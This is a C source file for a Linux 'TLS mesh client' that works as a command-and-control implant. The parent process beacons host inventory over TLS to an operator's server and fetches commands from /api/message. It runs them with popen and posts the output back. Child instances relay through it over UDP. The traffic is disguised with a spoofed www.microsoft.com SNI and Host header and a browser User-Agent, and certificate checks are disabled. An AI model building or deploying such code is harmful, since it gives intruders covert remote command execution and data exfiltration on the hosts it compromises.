/*
 * TLS Mesh Client (Linux)
 *
 * Parent mode: Connects to server via TLS, listens for children via UDP
 * Child mode:  Sends telemetry to parent via UDP
 *
 * Build: gcc tls_client_linux.c -o tls_client -lssl -lcrypto -lpthread
 *
 * Usage:
 *   Parent: ./tls_client -i <server_ip> -p <port> -l <udp_port> [-t interval]
 *   Child:  ./tls_client -P <parent_ip:port> [-t interval]
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

/* --- Configuration --- */
#define MAX_PEERS 64
#define BUFFER_SIZE 4096
#define FLUSH_INTERVAL (2 * 24 * 60 * 60)  /* Flush peer table every 2 days */

/* --- Peer Table --- */
typedef struct {
    char ip[16];
    char hostname[64];
    char os[64];
    long timestamp;
} Peer;

Peer peer_table[MAX_PEERS];
int peer_count = 0;
pthread_mutex_t peer_mutex = PTHREAD_MUTEX_INITIALIZER;

/* Add or update peer in table */
void peer_add(const char *ip, const char *hostname, const char *os, long ts) {
    pthread_mutex_lock(&peer_mutex);

    /* Check if peer exists */
    for (int i = 0; i < peer_count; i++) {
        if (strcmp(peer_table[i].ip, ip) == 0) {
            strncpy(peer_table[i].hostname, hostname ? hostname : "unknown", 63);
            strncpy(peer_table[i].os, os ? os : "unknown", 63);
            peer_table[i].timestamp = ts;
            pthread_mutex_unlock(&peer_mutex);
            return;
        }
    }

    /* Add new peer */
    if (peer_count < MAX_PEERS) {
        strncpy(peer_table[peer_count].ip, ip, 15);
        strncpy(peer_table[peer_count].hostname, hostname ? hostname : "unknown", 63);
        strncpy(peer_table[peer_count].os, os ? os : "unknown", 63);
        peer_table[peer_count].timestamp = ts;
        peer_count++;
    }

    pthread_mutex_unlock(&peer_mutex);
}

/* Build JSON of all peers for POST */
int peer_build_json(char *buf, size_t len) {
    pthread_mutex_lock(&peer_mutex);

    int n = snprintf(buf, len, "{\"clients\":[");
    for (int i = 0; i < peer_count; i++) {
        if (i > 0) n += snprintf(buf + n, len - n, ",");
        n += snprintf(buf + n, len - n,
            "{\"ip\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\",\"timestamp\":%ld}",
            peer_table[i].ip, peer_table[i].hostname, peer_table[i].os, peer_table[i].timestamp);
    }
    n += snprintf(buf + n, len - n, "]}");

    pthread_mutex_unlock(&peer_mutex);
    return n;
}

/* Clear all peers */
void peer_flush(void) {
    pthread_mutex_lock(&peer_mutex);
    peer_count = 0;
    printf("[*] Peer table flushed\n");
    pthread_mutex_unlock(&peer_mutex);
}

/* Print peer table */
void peer_print(void) {
    pthread_mutex_lock(&peer_mutex);
    printf("\n=== Peers (%d) ===\n", peer_count);
    for (int i = 0; i < peer_count; i++) {
        printf("  %s | %s | %s\n", peer_table[i].ip, peer_table[i].hostname, peer_table[i].os);
    }
    pthread_mutex_unlock(&peer_mutex);
}

/* --- Global State --- */
int listen_port = 0;        /* UDP port (parent mode) */
char parent_ip[64] = "";    /* Parent IP (child mode) */
int parent_port = 0;
int interval = 120;         /* Seconds between cycles */
volatile int running = 1;

/* SNI hostname and User-Agent for TLS traffic blending */
const char *sni_host = "www.microsoft.com";
const char *user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36";

/* --- UDP Listener Thread (Parent Mode) --- */
void *udp_listener(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listen_port);

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        printf("[!] UDP bind failed\n");
        return NULL;
    }
    printf("[*] UDP listening on port %d\n", listen_port);

    char buf[1024];
    while (running) {
        struct sockaddr_in src;
        socklen_t srclen = sizeof(src);
        int n = recvfrom(sock, buf, sizeof(buf) - 1, 0, (struct sockaddr *)&src, &srclen);
        if (n <= 0) continue;
        buf[n] = '\0';

        /* Get sender IP */
        char ip[16];
        inet_ntop(AF_INET, &src.sin_addr, ip, sizeof(ip));

        /* Parse JSON: hostname, os, ts */
        long ts = (long)time(NULL);
        char hostname[64] = "unknown", os[64] = "unknown";
        char *p;

        if ((p = strstr(buf, "\"hostname\":\"")) != NULL) {
            p += 12;
            char *end = strchr(p, '"');
            if (end) { strncpy(hostname, p, end - p); hostname[end - p] = '\0'; }
        }
        if ((p = strstr(buf, "\"os\":\"")) != NULL) {
            p += 6;
            char *end = strchr(p, '"');
            if (end) { strncpy(os, p, end - p); os[end - p] = '\0'; }
        }
        if ((p = strstr(buf, "\"ts\":")) != NULL) ts = atol(p + 5);

        printf("[UDP] %s (%s)\n", ip, hostname);
        peer_add(ip, hostname, os, ts);
    }

    close(sock);
    return NULL;
}

/* --- TLS Context --- */
static const unsigned char alpn_protos[] = "\x02h2\x08http/1.1";  /* ALPN: h2, http/1.1 */

SSL_CTX *create_tls_context(void) {
    SSL_library_init();
    OpenSSL_add_all_algorithms();

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    /* Set ALPN for HTTP/2 and HTTP/1.1 */
    SSL_CTX_set_alpn_protos(ctx, alpn_protos, sizeof(alpn_protos) - 1);

    return ctx;
}

/* --- Main --- */
int main(int argc, char *argv[]) {
    const char *server_ip = NULL;
    int server_port = 0;
    int is_parent = 0, is_child = 0;

    /* Parse arguments */
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-i")) server_ip = argv[++i];
        else if (!strcmp(argv[i], "-p")) server_port = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-l")) { listen_port = atoi(argv[++i]); is_parent = 1; }
        else if (!strcmp(argv[i], "-P")) {
            char *colon = strchr(argv[++i], ':');
            if (colon) {
                strncpy(parent_ip, argv[i], colon - argv[i]);
                parent_port = atoi(colon + 1);
                is_child = 1;
            }
        }
        else if (!strcmp(argv[i], "-t")) interval = atoi(argv[++i]);
    }

    /* Validate */
    if (!is_child && !is_parent) {
        printf("Usage:\n  Parent: %s -i <ip> -p <port> -l <udp_port>\n", argv[0]);
        printf("  Child:  %s -P <ip:port>\n", argv[0]);
        return 1;
    }

    /* === Child Mode === */
    if (is_child) {
        printf("[CHILD] -> %s:%d every %ds\n", parent_ip, parent_port, interval);

        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        struct sockaddr_in dest = {0};
        dest.sin_family = AF_INET;
        dest.sin_port = htons(parent_port);
        inet_pton(AF_INET, parent_ip, &dest.sin_addr);

        /* Get our IP */
        int tmp = socket(AF_INET, SOCK_DGRAM, 0);
        connect(tmp, (struct sockaddr *)&dest, sizeof(dest));
        struct sockaddr_in local;
        socklen_t len = sizeof(local);
        getsockname(tmp, (struct sockaddr *)&local, &len);
        char my_ip[16];
        inet_ntop(AF_INET, &local.sin_addr, my_ip, sizeof(my_ip));
        close(tmp);

        /* Get hostname and OS */
        char hostname[256];
        gethostname(hostname, sizeof(hostname));

        char os_info[128] = "Linux";
        struct utsname uts;
        if (uname(&uts) == 0) {
            snprintf(os_info, sizeof(os_info), "%s %s", uts.sysname, uts.release);
        }

        /* Send telemetry loop */
        char buf[512];
        while (1) {
            snprintf(buf, sizeof(buf), "{\"ip\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\",\"ts\":%ld}",
                my_ip, hostname, os_info, (long)time(NULL));
            sendto(sock, buf, strlen(buf), 0, (struct sockaddr *)&dest, sizeof(dest));
            printf("[>] %s\n", buf);
            sleep(interval);
        }
    }

    /* === Parent Mode === */
    if (is_parent) {
        printf("[PARENT] Server: %s:%d, UDP: %d, Interval: %ds\n", server_ip, server_port, listen_port, interval);

        SSL_CTX *ctx = create_tls_context();

        pthread_t tid;
        pthread_create(&tid, NULL, udp_listener, NULL);

        struct sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);
        inet_pton(AF_INET, server_ip, &server.sin_addr);

        /* Get hostname and OS once */
        char my_hostname[256];
        gethostname(my_hostname, sizeof(my_hostname));

        char my_os[128] = "Linux";
        struct utsname uts;
        if (uname(&uts) == 0) {
            snprintf(my_os, sizeof(my_os), "%s %s", uts.sysname, uts.release);
        }

        char req[BUFFER_SIZE], res[BUFFER_SIZE], body[2048];
        char my_ip[16] = "";
        long last_flush = (long)time(NULL);

        while (1) {
            /* Flush peer table every 2 days */
            if ((long)time(NULL) - last_flush >= FLUSH_INTERVAL) {
                peer_flush();
                last_flush = (long)time(NULL);
            }

            /* Connect to server */
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
                printf("[!] Connect failed\n");
                close(sock);
                sleep(interval);
                continue;
            }

            /* Get our IP, add self to peer table */
            struct sockaddr_in local;
            socklen_t len = sizeof(local);
            getsockname(sock, (struct sockaddr *)&local, &len);
            inet_ntop(AF_INET, &local.sin_addr, my_ip, sizeof(my_ip));
            peer_add(my_ip, my_hostname, my_os, (long)time(NULL));

            /* TLS handshake with SNI */
            SSL *ssl = SSL_new(ctx);
            SSL_set_tlsext_host_name(ssl, sni_host);
            SSL_set_fd(ssl, sock);
            if (SSL_connect(ssl) <= 0) {
                printf("[!] TLS failed\n");
                SSL_free(ssl);
                close(sock);
                sleep(interval);
                continue;
            }

            /* POST peer table */
            peer_build_json(body, sizeof(body));
            snprintf(req, sizeof(req),
                "POST /api/telemetry HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Content-Type: application/json\r\n"
                "Content-Length: %d\r\n"
                "Connection: keep-alive\r\n\r\n%s",
                sni_host, user_agent, (int)strlen(body), body);
            SSL_write(ssl, req, strlen(req));
            SSL_read(ssl, res, sizeof(res));

            /* GET message */
            snprintf(req, sizeof(req),
                "GET /api/message HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: application/json\r\n"
                "Connection: close\r\n\r\n",
                sni_host, user_agent);
            SSL_write(ssl, req, strlen(req));
            int n = SSL_read(ssl, res, sizeof(res) - 1);
            if (n > 0) {
                res[n] = '\0';
                char *msg = strstr(res, "\"message\":\"");
                if (msg) {
                    msg += 11;
                    char *end = strchr(msg, '"');
                    if (end) *end = '\0';
                    printf("\n>>> %s <<<\n", msg);

                    /* Execute command and capture output */
                    if (strcmp(msg, "No commands") != 0) {
                        char output[4096] = "";
                        FILE *fp = popen(msg, "r");
                        if (fp) {
                            char line[256];
                            while (fgets(line, sizeof(line), fp)) {
                                /* Escape special chars for JSON */
                                for (char *p = line; *p; p++) {
                                    if (*p == '\n') *p = ' ';
                                    if (*p == '\r') *p = ' ';
                                    if (*p == '"') *p = '\'';
                                    if (*p == '\\') *p = '/';
                                }
                                strncat(output, line, sizeof(output) - strlen(output) - 1);
                            }
                            pclose(fp);
                        }
                        printf("[*] Output: %s\n", output);

                        /* POST result back to server */
                        char result_body[4096];
                        snprintf(result_body, sizeof(result_body), "{\"cmd\":\"%s\",\"output\":\"%s\"}", msg, output);
                        snprintf(req, sizeof(req),
                            "POST /api/result HTTP/1.1\r\n"
                            "Host: %s\r\n"
                            "User-Agent: %s\r\n"
                            "Content-Type: application/json\r\n"
                            "Content-Length: %d\r\n"
                            "Connection: close\r\n\r\n%s",
                            sni_host, user_agent, (int)strlen(result_body), result_body);
                        SSL_write(ssl, req, strlen(req));
                        SSL_read(ssl, res, sizeof(res));
                    }
                }
            }

            SSL_shutdown(ssl);
            SSL_free(ssl);
            close(sock);

            peer_print();
            sleep(interval);
        }
    }

    return 0;
}
